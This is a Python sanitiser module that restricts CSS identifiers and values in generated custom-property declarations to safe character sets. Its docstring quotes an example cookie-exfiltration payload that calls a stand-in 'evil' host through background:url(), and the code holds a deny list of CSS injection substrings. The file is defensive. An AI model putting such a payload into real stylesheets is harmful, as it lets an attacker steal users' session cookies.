# SPDX-License-Identifier: Apache-2.0

"""
sanitise — keep generated CSS declarations free of injection.

``_export_css`` builds ``--<name>: <value>;`` declarations from tokens. If
either field contains stray characters (``;``, ``}``, ``url(``, newlines,
``@import``) an attacker-controlled token can escape the declaration and
inject arbitrary rules — including ``url(javascript:…)`` or exfiltration
via ``background:url("https://evil/"+document.cookie)``.

These helpers constrain both sides to safe character sets. Anything that
doesn't match the allow-list is replaced with a fallback.
"""
from __future__ import annotations

import html
import re

_IDENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_-]{0,63}$")
_LENIENT_IDENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_VALUE_RE = re.compile(r"^[A-Za-z0-9_\-#%. ,/()]{0,256}$")
_DANGEROUS_SUBSTRINGS = ("@import", "@charset", "expression(", "javascript:", "url(")

_FALLBACK_VALUE = "inherit"


def safe_css_ident(name: str, *, default: str = "token") -> str:
    name = (name or "").strip()
    if _IDENT_RE.match(name):
        return name
    if _LENIENT_IDENT_RE.match(name):
        normalized = name.replace(".", "-")
        if _IDENT_RE.match(normalized):
            return normalized
    return default


def safe_css_value(value: str, *, default: str = _FALLBACK_VALUE) -> str:
    value = (value or "").strip()
    if not value:
        return default
    if not _VALUE_RE.match(value):
        return default
    lower = value.lower()
    if any(d in lower for d in _DANGEROUS_SUBSTRINGS):
        return default
    return value


def safe_class_suffix(name: str, *, default: str = "section") -> str:
    return safe_css_ident(name, default=default)


def safe_html_text(value: str) -> str:
    return html.escape(str(value or ""), quote=True)
